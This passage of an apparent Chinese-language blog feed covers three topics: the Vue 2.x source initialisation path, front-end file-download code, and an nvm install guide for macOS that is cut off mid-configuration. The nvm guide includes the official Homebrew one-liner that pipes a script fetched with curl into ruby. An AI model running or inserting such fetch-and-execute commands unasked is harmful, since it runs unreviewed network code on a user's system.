&amp;&amp; warn(</span><br><span class="line">      <span class="string">`Do not mount Vue to &lt;html&gt; or &lt;body&gt; - mount to normal elements instead.`</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> options = <span class="keyword">this</span>.$options</span><br><span class="line">  <span class="comment">// resolve template/el and convert to render function</span></span><br><span class="line">  <span class="keyword">if</span> (!options.render) &#123;</span><br><span class="line">    <span class="keyword">let</span> template = options.template</span><br><span class="line">    <span class="keyword">if</span> (template) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> template === <span class="string">'string'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (template.charAt(<span class="number">0</span>) === <span class="string">'#'</span>) &#123;</span><br><span class="line">          template = idToTemplate(template)</span><br><span class="line">          <span class="comment">/* istanbul ignore if */</span></span><br><span class="line">          <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp; !template) &#123;</span><br><span class="line">            warn(</span><br><span class="line">              <span class="string">`Template element not found or is empty: <span class="subst">$&#123;options.template&#125;</span>`</span>,</span><br><span class="line">              <span class="keyword">this</span></span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (template.nodeType) &#123;</span><br><span class="line">        template = template.innerHTML</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span>) &#123;</span><br><span class="line">          warn(<span class="string">'invalid template option:'</span> + template, <span class="keyword">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el) &#123;</span><br><span class="line">      template = getOuterHTML(el)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (template) &#123;</span><br><span class="line">      <span class="comment">/* istanbul ignore if */</span></span><br><span class="line">      <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp; config.performance &amp;&amp; mark) &#123;</span><br><span class="line">        mark(<span class="string">'compile'</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> &#123; render, staticRenderFns &#125; = compileToFunctions(template, &#123;</span><br><span class="line">        shouldDecodeNewlines,</span><br><span class="line">        shouldDecodeNewlinesForHref,</span><br><span class="line">        delimiters: options.delimiters,</span><br><span class="line">        comments: options.comments</span><br><span class="line">      &#125;, <span class="keyword">this</span>)</span><br><span class="line">      options.render = render</span><br><span class="line">      options.staticRenderFns = staticRenderFns</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* istanbul ignore if */</span></span><br><span class="line">      <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp; config.performance &amp;&amp; mark) &#123;</span><br><span class="line">        mark(<span class="string">'compile end'</span>)</span><br><span class="line">        measure(<span class="string">`vue <span class="subst">$&#123;<span class="keyword">this</span>._name&#125;</span> compile`</span>, <span class="string">'compile'</span>, <span class="string">'compile end'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mount.call(<span class="keyword">this</span>, el, hydrating)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get outerHTML of elements, taking care</span></span><br><span class="line"><span class="comment"> * of SVG elements in IE as well.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getOuterHTML</span> (<span class="params">el: Element</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (el.outerHTML) &#123;</span><br><span class="line">    <span class="keyword">return</span> el.outerHTML</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> container = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>)</span><br><span class="line">    container.appendChild(el.cloneNode(<span class="literal">true</span>))</span><br><span class="line">    <span class="keyword">return</span> container.innerHTML</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Vue.compile = compileToFunctions</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure><p>通过<code>import Vue from &#39;./runtime/index&#39;</code>,它定义在 <code>src/platforms/web/runtime/index.js</code> 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'core/index'</span></span><br><span class="line"><span class="keyword">import</span> config <span class="keyword">from</span> <span class="string">'core/config'</span></span><br><span class="line"><span class="keyword">import</span> &#123; extend, noop &#125; <span class="keyword">from</span> <span class="string">'shared/util'</span></span><br><span class="line"><span class="keyword">import</span> &#123; mountComponent &#125; <span class="keyword">from</span> <span class="string">'core/instance/lifecycle'</span></span><br><span class="line"><span class="keyword">import</span> &#123; devtools, inBrowser, isChrome &#125; <span class="keyword">from</span> <span class="string">'core/util/index'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  query,</span><br><span class="line">  mustUseProp,</span><br><span class="line">  isReservedTag,</span><br><span class="line">  isReservedAttr,</span><br><span class="line">  getTagNamespace,</span><br><span class="line">  isUnknownElement</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'web/util/index'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; patch &#125; <span class="keyword">from</span> <span class="string">'./patch'</span></span><br><span class="line"><span class="keyword">import</span> platformDirectives <span class="keyword">from</span> <span class="string">'./directives/index'</span></span><br><span class="line"><span class="keyword">import</span> platformComponents <span class="keyword">from</span> <span class="string">'./components/index'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// install platform specific utils</span></span><br><span class="line">Vue.config.mustUseProp = mustUseProp</span><br><span class="line">Vue.config.isReservedTag = isReservedTag</span><br><span class="line">Vue.config.isReservedAttr = isReservedAttr</span><br><span class="line">Vue.config.getTagNamespace = getTagNamespace</span><br><span class="line">Vue.config.isUnknownElement = isUnknownElement</span><br><span class="line"></span><br><span class="line"><span class="comment">// install platform runtime directives &amp; components</span></span><br><span class="line">extend(Vue.options.directives, platformDirectives)</span><br><span class="line">extend(Vue.options.components, platformComponents)</span><br><span class="line"></span><br><span class="line"><span class="comment">// install platform patch function</span></span><br><span class="line">Vue.prototype.__patch__ = inBrowser ? patch : noop</span><br><span class="line"></span><br><span class="line"><span class="comment">// public mount method</span></span><br><span class="line">Vue.prototype.$mount = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  el?: string | Element,</span></span></span><br><span class="line"><span class="function"><span class="params">  hydrating?: boolean</span></span></span><br><span class="line"><span class="function"><span class="params"></span>): <span class="title">Component</span> </span>&#123;</span><br><span class="line">  el = el &amp;&amp; inBrowser ? query(el) : <span class="literal">undefined</span></span><br><span class="line">  <span class="keyword">return</span> mountComponent(<span class="keyword">this</span>, el, hydrating)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure><p>通过<code>import Vue from &#39;core/index&#39;</code>,在 <code>src/core/index.js 中</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'./instance/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; initGlobalAPI &#125; <span class="keyword">from</span> <span class="string">'./global-api/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; isServerRendering &#125; <span class="keyword">from</span> <span class="string">'core/util/env'</span></span><br><span class="line"><span class="keyword">import</span> &#123; FunctionalRenderContext &#125; <span class="keyword">from</span> <span class="string">'core/vdom/create-functional-component'</span></span><br><span class="line"></span><br><span class="line">initGlobalAPI(Vue)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$isServer'</span>, &#123;</span><br><span class="line">  <span class="keyword">get</span>: isServerRendering</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Object.defineProperty(Vue.prototype, '$ssrContext', &#123;</span><br><span class="line">  <span class="keyword">get</span> () &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.$vnode &amp;&amp; <span class="keyword">this</span>.$vnode.ssrContext</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// expose FunctionalRenderContext for ssr runtime helper installation</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Vue, <span class="string">'FunctionalRenderContext'</span>, &#123;</span><br><span class="line">  value: FunctionalRenderContext</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Vue.version = <span class="string">'__VERSION__'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure><h3 id="vue定义"><a href="#vue定义" class="headerlink" title="vue定义"></a>vue定义</h3><p>通过<code>import Vue from &#39;./instance/index&#39;</code>,在 <code>src/core/instance/index.js</code> 中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; initMixin &#125; <span class="keyword">from</span> <span class="string">'./init'</span></span><br><span class="line"><span class="keyword">import</span> &#123; stateMixin &#125; <span class="keyword">from</span> <span class="string">'./state'</span></span><br><span class="line"><span class="keyword">import</span> &#123; renderMixin &#125; <span class="keyword">from</span> <span class="string">'./render'</span></span><br><span class="line"><span class="keyword">import</span> &#123; eventsMixin &#125; <span class="keyword">from</span> <span class="string">'./events'</span></span><br><span class="line"><span class="keyword">import</span> &#123; lifecycleMixin &#125; <span class="keyword">from</span> <span class="string">'./lifecycle'</span></span><br><span class="line"><span class="keyword">import</span> &#123; warn &#125; <span class="keyword">from</span> <span class="string">'../util/index'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp;</span><br><span class="line">    !(<span class="keyword">this</span> <span class="keyword">instanceof</span> Vue)</span><br><span class="line">  ) &#123;</span><br><span class="line">    warn(<span class="string">'Vue is a constructor and should be called with the `new` keyword'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._init(options)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">initMixin(Vue)</span><br><span class="line">stateMixin(Vue)</span><br><span class="line">eventsMixin(Vue)</span><br><span class="line">lifecycleMixin(Vue)</span><br><span class="line">renderMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure><p>可以看到vue是一个用 Function 实现的类，我们只能通过 new Vue 去实例化它。</p><h3 id="initGlobalAPI-Vue"><a href="#initGlobalAPI-Vue" class="headerlink" title="initGlobalAPI(Vue)"></a>initGlobalAPI(Vue)</h3><p>在整个初始化过程中，除了给它的原型 prototype 上扩展方法，还会给 Vue 这个对象本身扩展全局的静态方法，它的定义在  <code>src/core/global-api/index.js</code> 中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">initGlobalAPI</span> (<span class="params">Vue: GlobalAPI</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// config</span></span><br><span class="line">  <span class="keyword">const</span> configDef = &#123;&#125;</span><br><span class="line">  configDef.get = <span class="function"><span class="params">()</span> =&gt;</span> config</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span>) &#123;</span><br><span class="line">    configDef.set = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      warn(</span><br><span class="line">        <span class="string">'Do not replace the Vue.config object, set individual fields instead.'</span></span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(Vue, <span class="string">'config'</span>, configDef)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// exposed util methods.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> these are not considered part of the public API - avoid relying on</span></span><br><span class="line">  <span class="comment">// them unless you are aware of the risk.</span></span><br><span class="line">  Vue.util = &#123;</span><br><span class="line">    warn,</span><br><span class="line">    extend,</span><br><span class="line">    mergeOptions,</span><br><span class="line">    defineReactive</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Vue.set = <span class="keyword">set</span></span><br><span class="line">  Vue.delete = del</span><br><span class="line">  Vue.nextTick = nextTick</span><br><span class="line"></span><br><span class="line">  Vue.options = Object.create(null)</span><br><span class="line">  ASSET_TYPES.forEach(type =&gt; &#123;</span><br><span class="line">    Vue.options[type + <span class="string">'s'</span>] = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// this is used to identify the "base" constructor to extend all plain-object</span></span><br><span class="line">  <span class="comment">// components with in Weex's multi-instance scenarios.</span></span><br><span class="line">  Vue.options._base = Vue</span><br><span class="line"></span><br><span class="line">  extend(Vue.options.components, builtInComponents)</span><br><span class="line"></span><br><span class="line">  initUse(Vue)</span><br><span class="line">  initMixin(Vue)</span><br><span class="line">  initExtend(Vue)</span><br><span class="line">  initAssetRegisters(Vue)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Vue 官网中关于全局 API 都可以在这里找到。有一点要注意的是，Vue.util 暴露的方法最好不要依赖，因为它可能经常会发生变化，是不稳定的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随着vue3.x的正式版推出，再加上长时间的使用vue，本着对本质的追求，学习总结一下源码的学习。考虑到3.x的相关环境还不是很稳定，未来一段时间，大多数时候用的应该还是2.x，先从2.x版本源码学习，相对网上参考资料也多。总结结合知识汇总下。&lt;/p&gt;
&lt;p&gt;本篇主要关于对vue源码的简单认识，主要是前期的准备工作。&lt;br&gt;
    
    </summary>
    
      <category term="vue" scheme="https://luckyp.top/categories/vue/"/>
    
    
      <category term="webpack" scheme="https://luckyp.top/tags/webpack/"/>
    
      <category term="源码" scheme="https://luckyp.top/tags/%E6%BA%90%E7%A0%81/"/>
    
      <category term="类型检测" scheme="https://luckyp.top/tags/%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>文件下载</title>
    <link href="https://luckyp.top/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
    <id>https://luckyp.top/文件下载/</id>
    <published>2020-01-05T16:00:00.000Z</published>
    <updated>2020-01-05T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>业务中常遇到前端下载文件的需求，简单汇总。<br><a id="more"></a></p><h2 id="返回Blob下载表格"><a href="#返回Blob下载表格" class="headerlink" title="返回Blob下载表格"></a>返回Blob下载表格</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$http.get(<span class="string">'***'</span>, &#123;</span><br><span class="line">    responseType: <span class="string">'blob'</span></span><br><span class="line">&#125;).then(data)&#123;</span><br><span class="line">    <span class="keyword">let</span> blob = <span class="keyword">new</span> Blob([data], &#123;</span><br><span class="line">        type: <span class="string">'application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.navigator.msSaveOrOpenBlob) &#123;</span><br><span class="line">        navigator.msSaveBlob(blob)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> elink = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">        elink.download = <span class="string">`<span class="subst">$&#123;fileName&#125;</span>.xls`</span></span><br><span class="line">        elink.style.display = <span class="string">'none'</span></span><br><span class="line">        elink.href = URL.createObjectURL(blob)</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(elink)</span><br><span class="line">        elink.click()</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(elink)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="返回Blob下载pdf"><a href="#返回Blob下载pdf" class="headerlink" title="返回Blob下载pdf"></a>返回Blob下载pdf</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> blob = <span class="keyword">new</span> Blob([data], &#123;</span><br><span class="line">    type: <span class="string">'application/pdf;charset=UTF-8'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.navigator.msSaveOrOpenBlob) &#123;</span><br><span class="line">    navigator.msSaveBlob(blob);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> elink = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">    elink.download = <span class="string">`<span class="subst">$&#123;fileName&#125;</span>.pdf`</span>;</span><br><span class="line">    elink.style.display = <span class="string">'none'</span>;</span><br><span class="line">    elink.href = URL.createObjectURL(blob);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(elink);</span><br><span class="line">    elink.click();</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(elink);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="返回url下载"><a href="#返回url下载" class="headerlink" title="返回url下载"></a>返回url下载</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">..._URL...</span><br><span class="line"></span><br><span class="line"><span class="comment">// location.href</span></span><br><span class="line">location.href = _URL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// window.open</span></span><br><span class="line"><span class="built_in">window</span>.open(_URL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// iframe</span></span><br><span class="line"><span class="keyword">let</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.style.display = <span class="string">'none'</span>; <span class="comment">// 防止影响页面</span></span><br><span class="line">iframe.style.height = <span class="number">0</span>; <span class="comment">// 防止影响页面</span></span><br><span class="line">iframe.src = _URL;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">iframe.remove();</span><br><span class="line">&#125;, <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// blob</span></span><br><span class="line"><span class="keyword">let</span> Req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">Req.open(<span class="string">'GET'</span>, _URL, <span class="literal">true</span>);</span><br><span class="line">Req.responseType = <span class="string">'blob'</span>;</span><br><span class="line">Req.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([Req.response], &#123;</span><br><span class="line">        type: <span class="string">'application/pdf'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> type = blob.type;</span><br><span class="line">    <span class="keyword">let</span> forceSaveableType = <span class="string">'application/octet-stream'</span>;</span><br><span class="line">    <span class="keyword">if</span> (type &amp;&amp; type !== forceSaveableType) &#123;</span><br><span class="line">        <span class="comment">// 强制下载，而非在浏览器中打开</span></span><br><span class="line">        <span class="keyword">let</span> slice = blob.slice || blob.webkitSlice || blob.mozSlice;</span><br><span class="line">        blob = slice.call(blob, <span class="number">0</span>, blob.size, forceSaveableType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> url = URL.createObjectURL(blob);</span><br><span class="line">    <span class="keyword">let</span> saveLink = <span class="built_in">document</span>.createElementNS(</span><br><span class="line">        <span class="string">'http://www.w3.org/1999/xhtml'</span>,</span><br><span class="line">        <span class="string">'a'</span></span><br><span class="line">    );</span><br><span class="line">    saveLink.href = url;</span><br><span class="line">    saveLink.download = <span class="string">'文件.pdf'</span>;</span><br><span class="line">    <span class="keyword">let</span> event = <span class="keyword">new</span> MouseEvent(<span class="string">'click'</span>, &#123;</span><br><span class="line">        bubbles: <span class="literal">true</span>,</span><br><span class="line">        cancelable: <span class="literal">true</span>,</span><br><span class="line">        view: <span class="built_in">window</span></span><br><span class="line">    &#125;);</span><br><span class="line">    saveLink.dispatchEvent(event);</span><br><span class="line">    URL.revokeObjectURL(url);</span><br><span class="line">&#125;;</span><br><span class="line">Req.send();</span><br></pre></td></tr></table></figure><h2 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h2><p>具体见文档<a href="https://github.com/rndme/download" target="_blank" rel="noopener">https://github.com/rndme/download</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download(<span class="string">'文件.pdf'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;业务中常遇到前端下载文件的需求，简单汇总。&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://luckyp.top/categories/js/"/>
    
    
      <category term="vue" scheme="https://luckyp.top/tags/vue/"/>
    
      <category term="文件" scheme="https://luckyp.top/tags/%E6%96%87%E4%BB%B6/"/>
    
      <category term="Blob" scheme="https://luckyp.top/tags/Blob/"/>
    
  </entry>
  
  <entry>
    <title>nvm-Mac</title>
    <link href="https://luckyp.top/nvm-Mac/"/>
    <id>https://luckyp.top/nvm-Mac/</id>
    <published>2019-12-10T08:40:36.000Z</published>
    <updated>2019-12-10T08:40:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间重装了下系统，就想着把<code>nvm</code>的安装也记录一下，便于我之后可以潇洒丢给对方一个链接，并保持自己的高冷。<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>开发环境中可能会因为<code>node</code>版本的问题，存在项目运行失败的问题，暂且不谈通过开发环境封装的解决方案。<code>nvm</code>可解决切换<code>node</code>版本的问题。</p><p><code>window</code>用户使用<code>nvm-Wndows</code>，可以参考 <a href="https://luckyp.top/nvm-Windows/">https://luckyp.top/nvm-Windows/</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>推荐使用<code>homebrew</code>安装，没有 homebrew 的可以通过以下命令安装<code>homebrew</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure><p>安装<code>nvm</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nvm</span><br></pre></td></tr></table></figure><p>会出现以下提示信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yplians-MacBook-Pro:~ iyx$ brew install nvm</span><br><span class="line">==&gt; Downloading https://github.com/creationix/nvm/archive/v0.35.2.tar.gz</span><br><span class="line">==&gt; Downloading from https://codeload.github.com/nvm-sh/nvm/tar.gz/v0.35.2</span><br><span class="line">######################################################################## 100.0%</span><br><span class="line">==&gt; Caveats</span><br><span class="line">Please note that upstream has asked us to make explicit managing</span><br><span class="line">nvm via Homebrew is unsupported by them and you should check any</span><br><span class="line">problems against the standard nvm install method prior to reporting.</span><br><span class="line">You should create NVM&apos;s working directory if it doesn&apos;t exist:</span><br><span class="line">  mkdir ~/.nvm</span><br><span class="line">Add the following to ~/.bash_profile or your desired shell</span><br><span class="line">configuration file:</span><br><span class="line">  export NVM_DIR=&quot;$HOME/.nvm&quot;</span><br><span class="line">  [ 